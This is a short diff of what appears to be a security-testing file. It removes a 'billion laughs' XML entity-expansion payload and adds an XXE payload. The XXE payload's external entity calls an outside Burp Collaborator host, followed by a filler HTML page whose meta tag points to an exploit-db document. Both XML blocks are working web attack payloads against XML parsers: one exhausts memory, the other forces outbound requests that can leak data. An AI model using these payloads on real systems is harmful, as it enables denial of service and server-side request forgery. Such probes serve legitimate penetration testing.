@@ -1,16 +1,13 @@
-<?xml version="1.0"?>
-<!DOCTYPE lolz [
- <!ENTITY lol "lol">
- <!ELEMENT lolz (#PCDATA)>
- <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
- <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
- <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
- <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
- <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
- <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
- <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
- <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
- <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-]>
-githubdsd-logo.png
-<lolz>&lol9;</lolz>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+ <!ELEMENT foo ANY >
+ <!ENTITY xxe SYSTEM "http://z666e2x8n3hh8kqinsrzb1l8ezkq8f.burpcollaborator.net" >]><foo>&xxe;</foo>
+<html>
+	<head>
+		<meta property="og:image" content="https://www.exploit-db.com/docs/english/44319-web-application-security-testing.pdf" />
+	</head>
+	<body>
+		<h1>My First Heading</h1>
+		<p>My first paragraph.</p>
+	</body>
+</html>
